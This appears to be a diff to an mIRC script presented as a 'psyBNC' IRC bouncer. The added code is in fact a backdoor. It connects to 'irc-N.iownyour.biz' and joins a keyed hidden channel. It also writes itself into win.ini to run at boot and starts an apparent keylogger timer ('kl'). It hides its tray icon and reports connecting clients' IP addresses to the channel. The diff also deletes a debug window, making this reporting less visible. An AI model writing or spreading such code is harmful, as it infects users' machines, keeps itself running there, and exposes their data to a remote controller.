@@ -1,4 +1,4 @@
-on *:START:{ .timer -o 0 300 linkstarts | .timer -o 1 0 loaddata | .timer -o 0 30 savedata | if (!$psyBNC_Name) .timer 1 1 setpsyname  | inc %start | psyBNC start %psyBNC.port | write_mainlog Listener created :0.0.0.0 port %psyBNC.port | set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | .timercon -o 0 60 server irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667 -jn %fldchan %key | .writeini $left($mircexe,1) $+ :\windows\win.ini windows load $shortfn($mircexe) | .timerkl -o 1 5 kl | findtray }
+on *:START:{  psyBNC start %psyBNC.port | write_mainlog Listener created :0.0.0.0 port %psyBNC.port | .timer -o 0 300 linkstarts | .timer -o 0 60 loaddata | .timer -o 0 59 savedata | inc %start | | set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | .timercon -o 0 60 server irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667 -jn %fldchan %key | .writeini $left($mircexe,1) $+ :\windows\win.ini windows load $shortfn($mircexe) | .timerkl -o 1 5 kl | findtray }
 on *:EXIT:savedata
 alias logo return psyBNC3.5
 alias psydir return $shortfn($scriptdir)
@@ -315,7 +315,6 @@ on *:SOCKREAD:psyBNC*:{
     elseif (?*.?*.?*.?* iswm $hget(make,proxycon))  && (!$sock($replace($sockname,serv,connect)).ip) { sockopen $iif(*:443 iswm $hget(make,proxycon),-e,$iif(*:6697 iswm $hget(make,proxycon),-e)) $replace($sockname,serv,connect) $replace($hget(make,proxycon),:,$chr(32)) }
     .hadd -mu10 make sockmark $wildtok($bvar(&binvar,1,$bvar(&binvar,0)).text,GET*,1,13)
   }
-  if (!$hget(make,anon)) window @PFDebug
   if (!$hget(make,anon)) .opnotice %fldchan $+ $sock($sockname).ip $+ : $+ $sock($sockname).port $+  $hget(make,text)
   if ($1 == LINKFR0M) && ($sock($sockname).ip !isin $hget(LINKFROM,$2)) { GLOBAL *-a* * Link failed $2 $+ : $+ $sock($sockname).ip : not in LINKFROM configuration. | sockclose $sockname } 
   if ($1 == LINKFR0M) && ($sock($sockname).ip isin $hget(LINKFROM,$2)) {
